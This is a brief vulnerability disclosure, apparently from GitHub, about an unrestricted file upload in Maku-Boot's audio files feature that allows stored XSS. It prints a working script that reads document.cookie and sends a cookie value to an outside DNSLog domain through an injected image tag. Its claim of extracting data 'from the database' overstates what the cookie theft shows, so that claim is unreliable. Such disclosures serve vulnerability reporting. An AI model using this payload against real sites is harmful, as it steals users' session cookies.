Maku-Boot has an XSS vulnerability that can expose the database. First, 
we go to the audio 
files to upload a file. Since Maku-Boot does not perform file validation, 
any file can be uploaded.
![](https://github.com/momo8877847/Maku-Boot/blob/main/990/36.jpg)
We upload the xss.html file, and we use DNSLog to receive data.
xss code script is:
<script>
var arr=document.cookie.split(/[;=]/);
var url = "http://"+arr[3]+".aqx0zx.dnslog.cn";
document.write('<img src="'+url+'"/>');
</script>
Then click upload, and access it
![](https://github.com/momo8877847/Maku-Boot/blob/main/990/IMG_20260531_091345.jpg)
Successfully extracted from the database
